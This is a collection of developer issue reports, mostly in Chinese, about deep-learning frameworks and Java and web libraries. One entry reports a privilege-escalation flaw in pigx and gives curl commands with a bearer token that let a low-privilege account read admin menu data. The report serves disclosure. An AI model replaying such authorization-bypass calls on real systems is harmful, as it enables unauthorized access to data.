动态图NCCL数据并行报invalid data type,"1）PaddlePaddle版本：1.5 post97 3）GPU：cuda 9.0 cudnn 7.1 训练信息 1）单机/多卡 2）22g 问题描述： 部分相关代码   <code>: Traceback (most recent call last): File ""trainfast_aiflow_elem_cls_oneshot.py"", line 237, in &lt;module&gt; main() File ""trainfast_aiflow_elem_cls_oneshot.py"", line 233, in main train_async(args) File ""trainfast_aiflow_elem_cls_oneshot.py"", line 145, in train_async prediction, acc1, acc5 = model.forward(img, label) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/parallel.py"", line 148, in forward return self._layers(*inputs, **kwargs) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/layers.py"", line 162, in __call__ outputs = self.forward(*inputs) File ""/ssd1/wenshuo/imgnet_multi_gpu/thirdparty/paddlemodels/metric_learning/models/resnet_embedding_oneshot.py"", line 118, in forward x = self.conv1(inputs) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/layers.py"", line 162, in __call__ outputs = self.forward(*inputs) File ""/ssd1/wenshuo/imgnet_multi_gpu/thirdparty/paddlemodels/metric_learning/models/resnet_embedding_oneshot.py"", line 39, in forward x = self.conv(inputs) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/layers.py"", line 160, in __call__ parallel_helper._broadcast_parameters(self._parameters.values()) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/parallel_helper.py"", line 43, in _broadcast_parameters collective._broadcast(param, 0, sync_mode=True) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/layers/collective.py"", line 59, in _broadcast ""root"": root}) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1742, in append_op kwargs.get(""stop_gradient"", False)) File ""/ssd1/wenshuo/anaconda2/lib/python2.7/site-packages/paddle/fluid/dygraph/tracer.py"", line 59, in trace_op framework._current_expected_place(), stop_gradient) paddle.fluid.core_avx.EnforceNotMet: invalid data type at [/paddle/paddle/fluid/operators/distributed_ops/broadcast_op.cu.cc:60] PaddlePaddle Call Stacks: 0 0x7f25b37d96a0p void paddle::platform::EnforceNotMet::Init&lt;char const*&gt;(char const*, char const*, int) + 352 1 0x7f25b37d9a19p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 137 2 0x7f25b4639871p paddle::operators::NCCLBroadcastOpKernel&lt;float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const + 1953 3 0x7f25b4639ac3p std::_Function_handler&lt;void (paddle::framework::ExecutionContext const&amp;), paddle::framework::OpKernelRegistrarFunctor &lt;paddle::platform::CUDAPlace, false, 0ul, paddle::operators::NCCLBroadcastOpKernel&lt;float&gt;, paddle::operators::NCCLBroadcastOpKernel&lt;double&gt;, paddle::operators::NCCLBroadcastOpKernel&lt;int&gt;, paddle::operators::NCCLBroadcastOpKernel&lt;long&gt;, paddle::operators::NCCLBroadcastOpKernel&lt;paddle::platform::float16&gt; &gt;::operator()(char const*, char const*, int) const::{lambda(paddle::framework::ExecutionContext const&amp;)#1}&gt;::_M_invoke(std::_Any_data const&amp;, paddle::framework::ExecutionContext const&amp;) + 35 4 0x7f25b39dd400p 5 0x7f25b38c7a45p 6 0x7f25b380c5c6p 7 0x7f25f1a4ffc7p PyEval_EvalFrameEx + 28695 8 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 9 0x7f25f1a4f9b8p PyEval_EvalFrameEx + 27144 10 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 11 0x7f25f19db377p 12 0x7f25f19b67a3p PyObject_Call + 67 13 0x7f25f1a4b4bep PyEval_EvalFrameEx + 9486 14 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 15 0x7f25f1a4f9b8p PyEval_EvalFrameEx + 27144 16 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 17 0x7f25f1a4f9b8p PyEval_EvalFrameEx + 27144 18 0x7f25f1a50f9ep PyEval_EvalFrameEx + 32750 19 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 20 0x7f25f19db28ap 21 0x7f25f19b67a3p PyObject_Call + 67 22 0x7f25f19c563dp 23 0x7f25f19b67a3p PyObject_Call + 67 24 0x7f25f1a0f8a4p 25 0x7f25f19b67a3p PyObject_Call + 67 26 0x7f25f1a4cb69p PyEval_EvalFrameEx + 15289 27 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 28 0x7f25f19db28ap 29 0x7f25f19b67a3p PyObject_Call + 67 30 0x7f25f1a4b4bep PyEval_EvalFrameEx + 9486 31 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 32 0x7f25f19db28ap 33 0x7f25f19b67a3p PyObject_Call + 67 34 0x7f25f19c563dp 35 0x7f25f19b67a3p PyObject_Call + 67 36 0x7f25f1a0f8a4p 37 0x7f25f19b67a3p PyObject_Call + 67 38 0x7f25f1a4cb69p PyEval_EvalFrameEx + 15289 39 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 40 0x7f25f19db28ap 41 0x7f25f19b67a3p PyObject_Call + 67 42 0x7f25f1a4b4bep PyEval_EvalFrameEx + 9486 43 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 44 0x7f25f19db377p 45 0x7f25f19b67a3p PyObject_Call + 67 46 0x7f25f19c563dp 47 0x7f25f19b67a3p PyObject_Call + 67 48 0x7f25f1a0f8a4p 49 0x7f25f19b67a3p PyObject_Call + 67 50 0x7f25f1a4b4bep PyEval_EvalFrameEx + 9486 51 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 52 0x7f25f1a4f9b8p PyEval_EvalFrameEx + 27144 53 0x7f25f1a50f9ep PyEval_EvalFrameEx + 32750 54 0x7f25f1a50f9ep PyEval_EvalFrameEx + 32750 55 0x7f25f1a524e9p PyEval_EvalCodeEx + 2025 56 0x7f25f1a5270ap PyEval_EvalCode + 26 57 0x7f25f1a6b9cdp 58 0x7f25f1a6cb48p PyRun_FileExFlags + 120 59 0x7f25f1a6dd68p PyRun_SimpleFileExFlags + 232 60 0x7f25f1a7ff8cp Py_Main + 2988 61 0x7f25f0ca9b45p __libc_start_main + 245 62 0x7f25f1f6f8bfp class ConvBNLayer(fluid.dygraph.Layer): def __init__(self, namescope, num_filters, filter_size, stride=1, groups=1, act=None): super(ConvBNLayer, self).__init__(namescope) self.conv = fluid.dygraph.Conv2D( self.full_name(), num_filters=num_filters, filter_size=filter_size, stride=stride, padding=(filter_size - 1) / 2, groups=groups, act=None, bias_attr=False) self.bn = fluid.dygraph.BatchNorm(self.full_name(), num_filters, act=act) def forward(self, inputs): 39: x = self.conv(inputs) x = self.bn(x) return x =========================== with fluid.dygraph.guard(place): logging.debug('enter train') model_name = args.model checkpoint = args.checkpoint pretrained_model = args.pretrained_model model_save_dir = args.model_save_dir model = models.__dict__[args.model]() params = model.params if args.multi_gpu: strategy = fluid.dygraph.parallel.prepare_context() model = fluid.dygraph.parallel.DataParallel(model, strategy) params[""lr""] = args.lr params[""lr_list""] = args.lr_list params[""learning_strategy""][""lr_steps""] = args.lr_steps params[""learning_strategy""][""name""] = args.lr_strategy optimizer = optimizer_setting(params, args) """""" if args.with_mem_opt: fluid.memory_optimize(train_prog, skip_opt_set=set(train_fetch_list)) """""" logging.debug('after run startup program') if checkpoint is not None: load_params = fluid.dygraph.load_persistables(checkpoint) model.load_dict(load_params[0]) devicenum = getgpunum() assert (args.train_batch_size % devicenum) == 0 train_batch_size = args.train_batch_size / devicenum test_batch_size = args.test_batch_size train_reader = paddle.batch(reader.train(args), batch_size=train_batch_size, drop_last=True) if args.multi_gpu: train_reader = fluid.contrib.reader.distributed_batch_reader(train_reader) test_reader = paddle.batch(reader.val(args), batch_size=test_batch_size, drop_last=False) totalruntime = 0 iter_no = args.start_step train_info = [0, 0, 0, 0] image_shape = [int(m) for m in args.image_shape.split("","")] while iter_no &lt;= args.total_iter_num: for batch_id, data in enumerate(train_reader()): dy_x_data = np.array([x[0].reshape(image_shape) for x in data]).astype('float32') y_data = np.array( [x[1] for x in data]).astype('int64').reshape(-1, 1) img = fluid.dygraph.to_variable(dy_x_data) label = fluid.dygraph.to_variable(y_data) label.stop_gradient = True t1 = time.time() model.train() prediction, acc1, acc5 = model.forward(img, label) loss = fluid.layers.cross_entropy(prediction, label) avg_loss = fluid.layers.mean(loss) if args.multi_gpu: avg_loss = model.scale_loss(avg_loss) avg_loss.backward() model.apply_collective_grads() else: avg_loss.backward() optimizer.minimize(avg_loss)"
A列表页，选卡页方式打开B列表页，打开同时传一个ID值到B，根据ID做个查询后，刷新B列表页。,"前台点击事件 后台接收 返回是json数据，列表页就如下图了   <code>: onclick=""$.modal.openTab('项目管理','HeTongSJY/projectlist/selectProsByContractid/'+row.contractid +')"" @GetMapping(""/selectProsByContractid/{contractid}"") @ResponseBody public TableDataInfo selectProsByContractid(@PathVariable(""contractid"") Long contractid) { startPage(); Projectlist projectlist=new Projectlist(); projectlist.setContractid(contractid); List&lt;Projectlist&gt; list = projectlistService.selectProjectlistList(projectlist); return getDataTable(list); }"
安全测试【越权访问】使用非admin账号且没有获取菜单的权限账号(test)，进行接口调用可以获取信息。,"环境信息 pigx版本: 3.9.0 是否修改包名: 无 安全测试【越权访问】使用非admin账号且没有获取菜单的权限账号(test)，进行接口调用，可以调通获取信息。 通过，复现未获取token，无法访问，认证授权是正常的。 但是，使用非admin账号且没有获取菜单的权限账号(test)，进行接口调用，可以调通并获取数据。   <code>: curl -X GET ""http://pig-gateway:9999/admin/menu"" -H ""accept: */*"" curl -X GET ""http://pig-gateway:9999/admin/menu"" -H ""accept: */*"" -H ""authorization: Bearer 758658f6-88a3-46ef-9b0e-57f6d071f058"""
paddle1.6.1通过save_inference_model保存的二进制词向量转换成文本报错,"参考语义角色标注的代码 解析通过保存的词向量 报错，看起来是header的大小不对，其中a是保存的二进制term_table路径，看起来就可以成功   <code>: def load_parameter(file_name, h, w): with open(file_name, 'rb') as f: f.read(16) # skip header. return np.fromfile(f, dtype=np.float32).reshape(h, w) fluid.io.save_inference_model(save_dirname, test_feed_order, [scale_infer], exe) term_table query_basic_emb = layers.embedding( input=query_basic, dtype='float32', size=[1000002, 128], param_attr='term_table', is_sparse=IS_SPARSE) f.read(28) &gt;&gt;&gt; load_parameter(a, 1000002, 128) Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""load_embedding.py"", line 25, in load_parameter return np.fromfile(f, dtype=np.float32).reshape(h, w) ValueError: cannot reshape array of size 128000259 into shape (1000002,128)"
创建mariadb的数据源时报java.lang.NullPointerException,"JDK版本： openjdk_8_201 hutool版本： 5.8.10 似乎不支持mariadb的数据源创建 at com.intellij.rt.junit.JUnitStarter.main(JUnitStarter.java:54) <ol start=""3"">   <code>: SimpleDataSource dataSource = new SimpleDataSource(""jdbc:mariadb://localhost:3306"", ""root"", ""rooter"");"
"training with GE, weights can't be inited or loaded",": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : compile mindspore with GE and training mode, weights can't be inited   <code>: bash build.sh -e d -b GE -m TRAIN"
【MindSpore】【Ascend】【C类】【SPPnet】8p训练性能不达标,"SPPNet模型8p训练性能不达标 Hardware Environment(Ascend/GPU/CPU) / 硬件环境: /device ascend : -- CANN 版本: (CANN 5.0.4 B065) -- Mindspore 版本：1.6.1 --Python 版本:Python 3.7.5 --操作系统版本 (e.g., Ubuntu 18.04):Ubuntu 18.04 1、执行命令：bash run_distribution_ascend.sh /home/hccl_8p_01234567_90.91.64.164.json /data/imagenet2012/train /data/imagenet2012/val sppnet_single 2、查看训练日志。 8p训练性能达标。 1、8p训练性能不达标，日志如下：   <code>: set_mempolicy: Operation not permitted epoch: 156, {'top_1_accuracy', 'top_5_accuracy'}: {'top_1_accuracy': 0.5546875, 'top_5_accuracy': 0.7833658854166666}, eval_cost:3.58 epoch: 157 step: 625, loss is 2.2135980129241943 epoch time: 133761.230 ms, per step time: 214.018 ms set_mempolicy: Operation not permitted epoch: 157, {'top_1_accuracy', 'top_5_accuracy'}: {'top_1_accuracy': 0.55419921875, 'top_5_accuracy': 0.7845052083333334}, eval_cost:3.55 epoch: 158 step: 625, loss is 2.177980422973633 epoch time: 134375.904 ms, per step time: 215.001 ms set_mempolicy: Operation not permitted epoch: 158, {'top_1_accuracy', 'top_5_accuracy'}: {'top_1_accuracy': 0.552734375, 'top_5_accuracy': 0.7854817708333334}, eval_cost:3.56 epoch: 159 step: 625, loss is 2.2651491165161133 epoch time: 136173.816 ms, per step time: 217.878 ms set_mempolicy: Operation not permitted epoch: 159, {'top_1_accuracy', 'top_5_accuracy'}: {'top_1_accuracy': 0.5538736979166666, 'top_5_accuracy': 0.7830403645833334}, eval_cost:3.52 epoch: 160 step: 625, loss is 2.4164726734161377 epoch time: 134321.835 ms, per step time: 214.915 ms"
 [新功能] 新增加密工具库,支持 生成 Token和读取 内容   <code>: MD5 DESC Jwt Jwt
[CT][MS][OCCM][SparseFillEmptyRows]算子性能用例报错 ,"算子在GPU 运行用例test_sfer_200x100_performance 时间不达标 def test_sfer_200x100_performance(): indices = rand_index(100, 100, 200) values =Tensor(np.array(np.random.randn(100)),dtype=ms.float32) default_value = Tensor(np.random.randn(),dtype = ms.float32) dense = Tensor([100, 200], dtype=ms.int64) fact = SparseFillEmptyRowsMock(inputs=[indices, values, dense, default_value]) test_operations_sparsefillemptyrows.py:455: self = SparseFillEmptyRowsMock&lt;&gt; E AssertionError ../share/ops/primitive/sparse_fill_empty_rows_ops.py:177: AssertionError test_sfer_2000x10000_performance 用例通过   <code>: fact.forward_profile_cmp() def forward_profile_cmp(self): run_time = 10 net = SparseFillEmptyRows() op_name = ""SparseFillEmptyRows"" inputs = [self.indices, self.values, self.dense_shape, self.default_value] forward_profile_ms = self.mindspore_profile(net, run_time, op_name, *inputs) net_tf = tf.raw_ops.SparseFillEmptyRows op_name_tf = 'name: ""SparseFillEmptyRows""' indices_tf = self.indices_np value_tf = self.values_np dense_tf = self.dense_shape_np default_value_tf = self.default_value_np forward_profile_tf = self.tensorflow_forward_profile(net_tf, run_time, op_name_tf, indices=indices_tf, values=value_tf, dense_shape=dense_tf, default_value=default_value_tf) logger.info(""forward_profile_tf: {}us"".format(forward_profile_tf)) logger.info(""forward_profile_ms: {}us"".format(forward_profile_ms)) assert forward_profile_tf &gt;= 0.9 * forward_profile_ms"
【路由隔离】不同租户请求的URL 隔离，并实现修改路由不影响其他租户,"环境信息 pigx版本: 3.8 是否修改包名: 否 目前路由维护，1 租户修改了，会影响2 租户，生产 不建议此功能开放给租户业务操作 目前修改方法 1 租户 2 租户 租户路由path 自动维护 租户ID 截断2L axios 拦截器自动维护 目前已知问题 swagger 功能失效 前端部分不走 需要自己维护 租户ID 前缀   <code>: http://localhost:8080/1/admin/XXX http://localhost:8080/2/admin/XXX public void initRoute() { Boolean result = redisTemplate.delete(CacheConstants.ROUTE_KEY); log.info(""初始化网关路由 {} "", result); routeConfService.list().forEach(route -&gt; { RouteDefinitionVo vo = new RouteDefinitionVo(); vo.setRouteName(route.getRouteName()); vo.setId(route.getRouteId()); vo.setUri(URI.create(route.getUri())); vo.setOrder(route.getOrder()); JSONArray filterObj = JSONUtil.parseArray(route.getFilters()); vo.setFilters(filterObj.toList(FilterDefinition.class)); JSONArray predicateObj = JSONUtil.parseArray(route.getPredicates()); List&lt;PredicateDefinition&gt; predicateDefinitionList = predicateObj.toList(PredicateDefinition.class); predicateDefinitionList.stream().forEach(predicate -&gt; predicate.getArgs() .computeIfPresent(""_genkey_0"", (k, v) -&gt; String.format(""/%s%s"", route.getTenantId(), v))); vo.setPredicates(predicateDefinitionList); log.info(""加载租户 {}，路由ID：{},{}"", route.getTenantId(), route.getRouteId(), vo); redisTemplate.setHashValueSerializer(new Jackson2JsonRedisSerializer&lt;&gt;(RouteDefinitionVo.class)); redisTemplate.opsForHash().put(CacheConstants.ROUTE_KEY, route.getRouteId(), vo); }); log.debug(""初始化网关路由结束 ""); } public class PigxRequestGlobalFilter implements GlobalFilter, Ordered { /** * Process the Web request and (optionally) delegate to the next * {@code WebFilter} through the given {@link GatewayFilterChain}. * * @param exchange the current server exchange * @param chain provides a way to delegate to the next filter * @return {@code Mono&lt;Void&gt;} to indicate when request processing is complete */ @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { // 1. 清洗请求头中from 参数 ServerHttpRequest request = exchange.getRequest().mutate() .headers(httpHeaders -&gt; httpHeaders.remove(SecurityConstants.FROM)) .build(); // 2. 重写StripPrefix addOriginalRequestUrl(exchange, request.getURI()); String rawPath = request.getURI().getRawPath(); String newPath = ""/"" + Arrays.stream(StringUtils.tokenizeToStringArray(rawPath, ""/"")) .skip(2L).collect(Collectors.joining(""/"")); ServerHttpRequest newRequest = request.mutate() .path(newPath) .build(); exchange.getAttributes().put(GATEWAY_REQUEST_URL_ATTR, newRequest.getURI()); return chain.filter(exchange.mutate() .request(newRequest.mutate() .build()).build()); } @Override public int getOrder() { return -1000; } } axios.interceptors.request.use(config =&gt; { NProgress.start() // start progress bar const TENANT_ID = getStore({name: 'tenantId'}) const isToken = (config.headers || {}).isToken === false const token = store.getters.access_token if (token &amp;&amp; !isToken) { config.headers['Authorization'] = 'Bearer ' + token// token } if (TENANT_ID) { axios.defaults.baseURL = '/' + TENANT_ID config.headers['TENANT-ID'] = TENANT_ID // 租户ID } config.headers['VERSION'] = 'lengleng' // 租户ID // headers中配置serialize为true开启序列化 if (config.method === 'post' &amp;&amp; config.headers.serialize) { config.data = serialize(config.data) delete config.data.serialize } if (config.method === 'get') { config.paramsSerializer = function (params) { return qs.stringify(params, {arrayFormat: 'repeat'}) } } return config }, error =&gt; { return Promise.reject(error) }) axios"
 远程请求代理模式非泛型参数导致数组溢出问题,在 #I5PMS5: 新增 `HttpFile` 类，针对远程请求上传文件封装 功能实现中，遗留下了一个错误的判断问题，那就是如果参数不是泛型将导致 出现数组溢出异常。 相关资料 编写更新日志内容 期望效果 无异常且不影响旧版本升级。 !559: 修复因 v4.4.0 版本导致远程请求代理模式非泛型参数导致数组溢出问题   <code>: u.Parameter.ParameterType.GenericTypeArguments[0] == typeof(HttpFile)
fluid版本定义常量和张量问题,"比如这个接口：http://www.paddlepaddle.org/documentation/api/zh/0.15.0/layers.html#permalink-183-fill_constant 比如我想定义一个shape为的，值为，但是赋值能是一个数字，如下： 类型的问题还有这个接口：http://www.paddlepaddle.org/documentation/api/zh/0.15.0/layers.html#permalink-177-create_global_var   <code>: [2,2] [[1,2].[3,4]] data = fluid.layers.fill_constant(shape=[2,2], value=0, dtype='int64')"
[CT][MS][OCCM][ParameterizedTruncatedNormal] The sample of ParameterizedTruncatedNormal operator has error.,"The sample of ParameterizedTruncatedNormal operator has error The sample of ParameterizedTruncatedNormal operator has error / 硬件环境: /device ascend/CPU/ : -- MindSpore version : -- Python version : Python 3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 运行资料中的样例： cd mindspore/ops/operations pytest -vra --doctest-modules -o doctest_optionflags=NORMALIZE_WHITESPACE --tb=long random_ops.py::mindspore.ops.operations.random_ops.ParameterizedTruncatedNormal   <code>: Examples: &gt;&gt;&gt; shape = Tensor(np.array([2, 3]), mstype.int32) &gt;&gt;&gt; mean = Tensor(np.array([0], mstype.float32)) &gt;&gt;&gt; stdevs = Tensor(np.array([1], mstype.float32)) &gt;&gt;&gt; min = Tensor(np.array([-100], mstype.float32)) &gt;&gt;&gt; max = Tensor(np.array([100], mstype.float32)) &gt;&gt;&gt; seed = 1 &gt;&gt;&gt; seed2 = 2 &gt;&gt;&gt; parameterized_truncated_normal = ops.ParameterizedTruncatedNormal(seed=seed, seed2=seed2) &gt;&gt;&gt; output = parameterized_truncated_normal(shape, mean, stdevs, min, max) &gt;&gt;&gt; print(output) [[-0.54974616 -1.4028727 1.5827523 ] [ 0.25759354 -1.9593946 -1.5078077 ]] ___________________________________________________ [doctest] mindspore.ops.operations.random_ops.ParameterizedTruncatedNormal ____________________________________________________ 416 ValueError: If `shape` has less than 2 elements. 417 ValueError: If `shape` is not a 1-D tensor. 418 ValueError: If the number of elements of output is more than 1000000. 419 420 Supported Platforms: 421 ``Ascend`` ``CPU`` 422 423 Examples: 424 &gt;&gt;&gt; shape = Tensor(np.array([2, 3]), mstype.int32) 425 &gt;&gt;&gt; mean = Tensor(np.array([0], mstype.float32)) UNEXPECTED EXCEPTION: TypeError(""Cannot interpret 'mindspore.float32' as a data type"") Traceback (most recent call last): File ""/root/miniconda3/envs/zhujunan2/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest mindspore.ops.operations.random_ops.ParameterizedTruncatedNormal[1]&gt;"", line 1, in &lt;module&gt; TypeError: Cannot interpret 'mindspore.float32' as a data type /root/miniconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/ops/operations/random_ops.py:425: UnexpectedException"
Quartz管理中的任务删除失败,"pigx版本: 2.7.0 是否修改包名: 否 quartz任务删除的时候出错 controller层的注解是@DeleteMapping(""/{id}"") 但是接收参数的时候是这样@PathVariable Integer jobId   <code>: Missing URI template variable 'jobId' for method parameter of type Integer"
The way to solve the error complaint in MKLDNNLayer,"When building the latest paddle, one may meet the error in MKLDNNLayer: @ luotao provides one solution that removes the related subdirectories in the directory: If similar errors occur in this layer, please try the same solution first.   <code>: error: no matching function for call to 'mkldnn::sum::primitive_desc::primitive_des(mkldnn::memory::desc, std::vector&lt;float&gt;&amp;, std::vector&lt;mkldnn::memory::primitive_desc&gt;&amp;)' build rm -r build/third_party/mkldnn rm -r build/third_party/install/mkldnn"
[CT][MS][Upsamplenearest3d] grad test has precision issue at ascend,"Ascned 后端，Upsamplenearest3d 反向计算有精度问题 / 硬件环境: /device ascend : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 用例通过， 结果正确   <code>: def test_upsamplenearest3d_scales_list_float32(): x = Tensor(np.random.randn(9, 20, 8, 52, 56), dtype=mstype.float32) fact = UpsampleNearest3dMock(attributes={'scales': [7.0, 4.1, 0.5]}, inputs=[x]) fact.forward_cmp() &gt; fact.grad_cmp() def test_upsamplenearest3d_scales_list_float32(): x = Tensor(np.random.randn(9, 20, 8, 52, 56), dtype=mstype.float32) fact = UpsampleNearest3dMock(attributes={'scales': [7.0, 4.1, 0.5]}, inputs=[x]) fact.forward_cmp() &gt; fact.grad_cmp() E AssertionError: E data_expected_std:[-0.63012135 5.035788 -9.45827 ... 2.947872 -8.244127 E 3.0064874 ] E data_me_error:[-6.2970495 2.2416604 -9.35837 ... 5.5974236 -7.9024568 1.1088251] E loss:[5.6669283 2.7941277 0.09990025 ... 2.6495516 0.3416705 1.8976623 ]"
bug提交：com.stylefeng.guns.core.intercept.RestApiInteceptor 第31行强制转换有bug,"com.stylefeng.guns.core.intercept.RestApiInteceptor 第31行代码 如果API控制器加上 @CrossOrigin 用来解决跨域请求的话，上述代码会报 强制类型转换错误。 报错如下：   <code>: public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { if (handler instanceof org.springframework.web.servlet.resource.ResourceHttpRequestHandler) { return true; } HandlerMethod handlerMethod = (HandlerMethod) handler; //此处强制转换有bug return check(request, response, handlerMethod); } /** * 接口控制器提供 * * @author stylefeng * @Date 2018/7/20 23:39 */ @RestController @CrossOrigin //解决ajax跨域请求 @RequestMapping(""/gunsApi"") public class ApiController extends BaseController { java.lang.ClassCastException: org.springframework.web.servlet.handler.AbstractHandlerMapping$PreFlightHandler cannot be cast to org.springframework.web.method.HandlerMethod"
【众智】【数据算子】MaskAlongAxis,"1 功能介绍 输入一个shape为(...,freqency,time)的tensor 沿着axis轴，从mask_start开始遮罩，遮罩长度为mask_width,遮罩值为mask_value. 当axis=1时对频域遮罩，axis=2时对时域遮罩 1.1 算子分析 当mask_start=0,mask_width=1,mask_value=2.0,axis=2时执行效果如下 2 接口描述 __init__参数 mask_start int 遮罩起始点 mask_width int 遮罩长度 mask_value float 填充值 axis int axis=1,2时分别对频域时域遮罩 2.2 C++层接口   <code>: class mindspore.dataset.audio.transforms.MaskAlongAxis(mask_start,mask_width,mask_value,axis) 1. MaskAlongAxis(int mask_start,int mask_width,float mask_value,int axis);"
获取微信小程序二维码数据格式错误,"调用代码： 在 cn.binarywang.wx.miniapp.bean.WxMaWxcodeLimit 类中使用 lombok 的 @杨泽 注释，导致父类中的 toString 方法被 lombok 重写，在给小程序二维码接口发送时，发的是 lombok toString 的数据，而不是父类 toString 的 json 格式。   <code>: { ""errcode"": 47001, ""errmsg"": ""data format error hint: [rehBta08984528]"" } WxMaQrcodeService qrcodeService = wxService.getQrcodeService(); try { WxMaCodeLineColor lineColor = new WxMaCodeLineColor(""3"",""4"",""5""); File qrcdoe = qrcodeService.createWxCodeLimit(bounty.getId(), ""pages/index/index"", 430, false, lineColor); } catch (WxErrorException e) { e.printStackTrace(); }"
Refine debug string of Parameter,"fixes https://github.com/PaddlePaddle/Paddle/issues/7856 Before: After: Usage: The calls with   <code>: vars { name: ""fc_0.w_0"" type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 784 dims: 200 } } persistable: true } vars { name: ""fc_0.w_0"" type: LOD_TENSOR lod_tensor { tensor { data_type: FP32 dims: 784 dims: 200 } } persistable: true error_clip: None stop_gradient: False trainable: True optimize_attr: {'learning_rate': 1.0} regularizer: L2Decay, regularization_coeff=0.032000 gradient_clip_attr: ByValue, min=-1.000000, max=1.000000 } debug_str = program.to_string(throw_on_error=True, with_details=True) __str__() to_string throw_on_error=True, with_details=False"
关于Injector类的一些看法,"类全路径：com.jfinal.core.Injector 表单内容 提交表单 Parameter : groupList[0].ids=111 groupList[0].names=222 groupList[1].ids=333 groupList[1].names=444 把表单内容处理成list的model对象 处理类方法 可以很好处理此类的表单提交，转换成list的model对象。 但是应用在另一个场景，如json提交 提交表单 Parameter : groupList[0][ids]=111 groupList[0][names]=222 groupList[1][ids]=333 groupList[1][names]=444 这个情况com.jfinal.core.Injector类就不能很好的处理了。 查看源码发现 attrName = paraName.substring(modelNameAndDot.length(), paraName.length()-1); 这样这个方法就能兼容表单提交和json提交。 或者做简单处理   <code>: &lt;input type=""hidden"" name=""groupList[0].ids"" value=""111""/&gt; &lt;input type=""text"" name=""groupList[0].names"" value=""222""/&gt; &lt;input type=""hidden"" name=""groupList[1].ids"" value=""333""/&gt; &lt;input type=""text"" name=""groupList[1].names"" value=""444""/&gt; List&lt;Group&gt; groupList = ToolModelInjector.injectModels(getRequest(), Group.class, ""groupList""); public static &lt;T extends Model&lt;T&gt;&gt; List&lt;T&gt; injectModels(final HttpServletRequest request, Class&lt;? extends T&gt; modelClass, String prefix) { int index = 0; String arrayPrefix = prefix + ""[""; String key = null; Enumeration&lt;String&gt; names = request.getParameterNames(); while (names.hasMoreElements()) { key = names.nextElement(); if (key.startsWith(arrayPrefix) &amp;&amp; key.indexOf(""]"") != -1) { int indexTemp = Integer.parseInt(key.substring(key.indexOf(""["") + 1, key.indexOf(""]""))); if(indexTemp &gt; index){ index = indexTemp; // 找到最大的数组索引 } } } List&lt;T&gt; modelList = new ArrayList&lt;T&gt;(); for (int i = 0; i &lt;= index; i++) { T baseModel = (T) Injector.injectModel(modelClass, prefix + ""["" + i + ""]"", request, false); modelList.add(baseModel); } return modelList; } var postData = { groupList:[ {ids:""111"", names:""222""}, {ids:""333"", names:""444""}, ] } $http.post(url, postData) .success(function(data, status, headers, config){ $scope.msg = data; }); if (modelNameAndDot != null) { if (paraName.startsWith(modelNameAndDot)) { attrName = paraName.substring(modelNameAndDot.length(), paraName.length()-1); } else { continue ; } } else { attrName = paraName; } if (StrKit.notBlank(modelName)) { // 判断 paraName 的格式 if (场景一) { String modelNameAndDot = modelName + "".""; attrName = paraName.substring(modelNameAndDot.length()); } else if(场景二) { String modelNameAndDot = modelName + ""[""; attrName = paraName.substring(modelNameAndDot.length(), paraName.length()-1); } else { continue ; } } else { attrName = paraName; } String modelNameAndDot1 = StrKit.notBlank(modelName) ? modelName + ""."" : null; String modelNameAndDot2 = StrKit.notBlank(modelName) ? modelName + ""["" : null; if (StrKit.notBlank(modelName)) { if (paraName.startsWith(modelNameAndDot1)) { attrName = paraName.substring(modelNameAndDot.length()); } else if(paraName.startsWith(modelNameAndDot2)) { attrName = paraName.substring(modelNameAndDot.length(), paraName.length()-1); } else { continue ; } } else { attrName = paraName; }"
Added non-passive event listener to a scroll-blocking 'mousewheel' event. Consider marking event handler as 'passive' to make the page more responsive,浏览器打开F12就报这个，我想问的是这个能优化一下吗？据说是优化页面性能的   <code>: xm-select.js:8 [Violation]Added non-passive event listener to a scroll-blocking 'mousewheel' event. Consider marking event handler as 'passive' to make the page more responsive. See https://www.chromestatus.com/feature/5745543795965952 value @ xm-select.js:8 (匿名) @ xm-select.js:8 (匿名) @ xm-select.js:8 R @ xm-select.js:8 T @ xm-select.js:8 value @ xm-select.js:8 value @ xm-select.js:8 e @ xm-select.js:8 render @ xm-select.js:8 (匿名) @ 2.js:9 (匿名) @ docs.js:14 Xe @ docs.js:14
